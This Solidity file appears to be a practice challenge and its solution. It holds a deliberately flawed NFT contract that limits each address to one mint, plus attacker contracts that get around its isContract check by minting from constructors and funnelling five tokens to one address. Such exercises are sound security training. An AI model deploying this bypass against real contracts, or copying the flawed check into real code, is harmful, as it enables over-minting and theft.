// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract Overmint3 is ERC721 {
    using Address for address;
    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint3", "AT") {}

    function mint() external {
        require(!msg.sender.isContract(), "no contracts");
        require(amountMinted[msg.sender] < 1, "only 1 NFT");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }
}

contract Overmint3Attacker {
    constructor (Overmint3 victim, address attacker) {
        victim.mint();
        victim.transferFrom(address(this), attacker, victim.totalSupply());
        new Overmint3AttackerHelper(victim, attacker);
        new Overmint3AttackerHelper(victim, attacker);
        new Overmint3AttackerHelper(victim, attacker);
        new Overmint3AttackerHelper(victim, attacker);
    }
}

contract Overmint3AttackerHelper {
    constructor (Overmint3 victim, address attacker) {
        victim.mint();
        victim.transferFrom(address(this), attacker, victim.totalSupply());
    }
}
